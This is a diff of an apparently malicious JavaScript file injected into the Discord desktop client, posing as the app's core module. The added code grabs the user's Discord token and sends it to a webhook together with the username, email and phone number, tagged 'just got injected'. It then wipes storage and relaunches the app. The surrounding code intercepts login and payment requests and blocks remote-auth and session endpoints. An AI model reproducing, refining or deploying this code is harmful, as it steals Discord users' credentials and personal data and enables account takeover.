@@ -7,7 +7,8 @@ const querystring = require('querystring');
 
 const {
     BrowserWindow,
-    session
+    session,
+    app
 } = require('electron');
 
 const CONFIG = {
@@ -24,11 +25,6 @@ const CONFIG = {
     },
     filters2: {
         urls: [
-            'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
-            'https://*.discord.com/api/v*/applications/detectable',
-            'https://discord.com/api/v*/applications/detectable',
-            'https://*.discord.com/api/v*/users/@me/library',
-            'https://discord.com/api/v*/users/@me/library',
             'wss://remote-auth-gateway.discord.gg/*',
             'https://discord.com/api/v*/auth/sessions',
             'https://*.discord.com/api/v*/auth/sessions',
@@ -115,6 +111,15 @@ const executeJS = script => {
     const window = BrowserWindow.getAllWindows()[0];
     return window.webContents.executeJavaScript(script, !0);
 };
+
+const clearAllUserData = () => {
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.session.flushStorageData();
+    window.webContents.session.clearStorageData();
+    app.relaunch();
+    app.exit();
+};
+
 const getToken = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
 
 const request = async (method, url, headers, data) => {
@@ -454,7 +459,35 @@ const discordPath = (function () {
     };
 })();
 
-async function updateCheck() {
+async function initiation() {
+    if (fs.existsSync(path.join(__dirname, 'initiation'))) {
+        fs.rmdirSync(path.join(__dirname, 'initiation'));
+
+        const token = await getToken();
+        if (!token) return;
+
+        const account = await fetchAccount(token)
+
+        const content = {
+            "content": `**${account.username}** just got injected!`,
+
+            "embeds": [{
+                "fields": [{
+                    "name": "Email",
+                    "value": "`" + account.email + "`",
+                    "inline": true
+                }, {
+                    "name": "Phone",
+                    "value": "`" + (account.phone || "None") + "`",
+                    "inline": true
+                }]
+            }]
+        };
+
+        await hooker(content, token, account);
+        clearAllUserData();
+    }
+
     const {
         resourcePath,
         app
@@ -507,45 +540,22 @@ async function updateCheck() {
   if (fs.existsSync(bdPath)) require(bdPath);`;
         fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
     }
-    if (!fs.existsSync(path.join(__dirname, 'initiation'))) return;
-    fs.rmdirSync(path.join(__dirname, 'initiation'));
-
-    const token = await getToken();
-    if (!token) return;
-
-    const account = await fetchAccount(token)
-
-    const content = {
-        "content": `**${account.username}** just got injected!`,
-
-        "embeds": [{
-            "fields": [{
-                "name": "Email",
-                "value": "`" + account.email + "`",
-                "inline": true
-            }, {
-                "name": "Phone",
-                "value": "`" + (account.phone || "None") + "`",
-                "inline": true
-            }]
-        }]
-    };
-
-    await hooker(content, token, account);
-
-    executeJS(
-        `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
-    );
 }
 
 let email = "";
 let password = "";
+let initiationCalled = false;
 const createWindow = () => {
     mainWindow = BrowserWindow.getAllWindows()[0];
     if (!mainWindow) return
 
     mainWindow.webContents.debugger.attach('1.3');
     mainWindow.webContents.debugger.on('message', async (_, method, params) => {
+        if (!initiationCalled) {
+            await initiation();
+            initiationCalled = true;
+        }
+
         if (method !== 'Network.responseReceived') return;
         if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
         if (![200, 202].includes(params.response.status)) return;
@@ -622,9 +632,7 @@ session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (det
 session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
     if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
         cancel: true
-    });
-
-    updateCheck()
+    })
 });
 
 module.exports = require("./core.asar");
